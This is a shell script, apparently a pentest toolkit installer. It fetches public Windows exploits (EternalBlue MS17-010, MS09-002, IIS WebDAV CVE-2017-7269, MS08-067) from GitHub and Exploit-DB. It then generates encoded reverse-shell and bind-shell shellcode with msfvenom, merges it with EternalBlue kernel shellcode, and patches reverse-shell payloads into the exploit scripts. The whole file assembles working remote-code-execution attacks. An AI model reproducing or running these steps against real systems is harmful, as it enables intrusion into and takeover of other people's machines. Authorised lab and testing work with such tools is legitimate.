# MS17-010 - START
mkdir -p public/exploits_windows/smb/ms17-010
cd public/exploits_windows/smb/ms17-010
  banner "exploits_windows/smb/ms17-010 - https://github.com/helviojunior/MS17-010.git"
  git clone --depth=1 --recursive https://github.com/helviojunior/MS17-010.git .

  if confirm "Regenerate payloads for exploits_windows/smb/ms17-010 [y/n]? "; then
    nasm -f bin shellcode/eternalblue_kshellcode_x64.asm -o ./shellcode/sc_x64_kernel.bin
    msfvenom -p windows/x64/shell_reverse_tcp LPORT=$port_local LHOST=$ip_local EXITFUNC=thread --platform windows -a x64 --format raw -o ./shellcode/sc_x64_payload_rev.bin
    msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote --platform windows -a x64 --format raw -e x86/shikata_ga_nai -o ./shellcode/sc_x64_payload.bin
    cat ./shellcode/sc_x64_kernel.bin ./shellcode/sc_x64_payload.bin > ./shellcode/sc_x64.bin
    cat ./shellcode/sc_x64_kernel.bin ./shellcode/sc_x64_payload_rev.bin > ./shellcode/sc_x64_rev.bin

    nasm -f bin shellcode/eternalblue_kshellcode_x86.asm -o ./shellcode/sc_x86_kernel.bin
    msfvenom -p windows/shell_reverse_tcp LPORT=$port_local LHOST=$ip_local EXITFUNC=thread --platform windows -a x86 --format raw -e x86/shikata_ga_nai -o ./shellcode/sc_x86_payload_rev.bin
    msfvenom -p windows/shell_bind_tcp LPORT=$port_remote --platform windows -a x86 --format raw -e x86/shikata_ga_nai -o ./shellcode/sc_x86_payload.bin
    cat ./shellcode/sc_x86_kernel.bin ./shellcode/sc_x86_payload.bin > ./shellcode/sc_x86.bin
    cat ./shellcode/sc_x86_kernel.bin ./shellcode/sc_x86_payload_rev.bin > ./shellcode/sc_x86_rev.bin

    python ./shellcode/eternalblue_sc_merge.py ./shellcode/sc_x86.bin ./shellcode/sc_x64.bin ./shellcode/sc_all.bin
    python ./shellcode/eternalblue_sc_merge.py ./shellcode/sc_x86_rev.bin ./shellcode/sc_x64_rev.bin ./shellcode/sc_all_rev.bin
  fi
cd -
# MS17-010 - END

# MS09-002 - START
mkdir -p public/exploits_windows/ie/ms09-002
cd public/exploits_windows/ie/ms09-002

  if [ ! -f 8080_rev.py ]; then
    banner "exploits_windows/ie/ms09-002 - https://www.exploit-db.com/exploits/8080"
    searchsploit -m 8080 
    js_le_payload=`cat ../../../payloads_windows/shell_reverse_tcp_x86.js_le`
    cp 8080.py 8080_rev.py
    sed -i "37s/.*/var c = unescape(\"$js_le_payload\");/" 8080_rev.py
  fi

  if [ ! -f 8152_rev.py ]; then
    banner "exploits_windows/ie/ms09-002 - https://www.exploit-db.com/exploits/8152"
    searchsploit -m 8152
    cat 8152.py | head -n 17 > 8152_rev.py
    cat ../../../payloads_windows/shell_reverse_tcp_x86.js_le | sed "s/buf/payload/g" >> 8152_rev.py
    cat 8152.py | tail -n 102 >> 8152_rev.py
  fi

cd -
# MS09-002 - END

mkdir -p public/exploits_windows/webdav
cd public/exploits_windows/webdav

  if [ ! -f ScStoragePathFromUrl-explodingcan.py ]; then
    banner "exploits_windows/webdav - ScStoragePathFromUrl-explodingcan - https://github.com/danigargu/explodingcan"
    wget -Nq https://github.com/danigargu/explodingcan/raw/master/explodingcan.py
    mv explodingcan.py ScStoragePathFromUrl-explodingcan.py
  fi

  if [ ! -d ScStoragePathFromUrl-CVE-2017-7269 ]; then
    banner "exploits_windows/webdav - ScStoragePathFromUrl-CVE-2017-7269 - https://github.com/gottburgm/Exploits/tree/master/CVE-2017-7269"
    mkdir ScStoragePathFromUrl-CVE-2017-7269
    wget -Nq -P ScStoragePathFromUrl-CVE-2017-7269 https://raw.githubusercontent.com/gottburgm/Exploits/master/CVE-2017-7269/CVE_2017_7269.pl
    wget -Nq -P ScStoragePathFromUrl-CVE-2017-7269 https://raw.githubusercontent.com/gottburgm/Exploits/master/CVE-2017-7269/install.sh
  fi

cd -

mkdir -p public/exploits_windows/rpc
cd public/exploits_windows/rpc

  if [ ! -f ms08-067-NetAPI-exploitdb.py ]; then
    banner "exploits_windows/rpc - ms08-067-NetAPI-exploitdb.py - https://www.exploit-db.com/exploits/40279"
    searchsploit -m 40279
    mv 40279.py ms08-067-NetAPI-exploitdb.py
  fi

  # https://labs.f-secure.com/assets/BlogFiles/hello-ms08-067-my-old-friend.pdf
  banner "exploits_windows/rpc - ms08-067-NetAPI - https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py"
  wget -Nq https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
  banner "exploits_windows/rpc - ms08-067-NetAPI - https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067_w2k3_sp2.py"
  wget -Nq https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067_w2k3_sp2.py

cd -
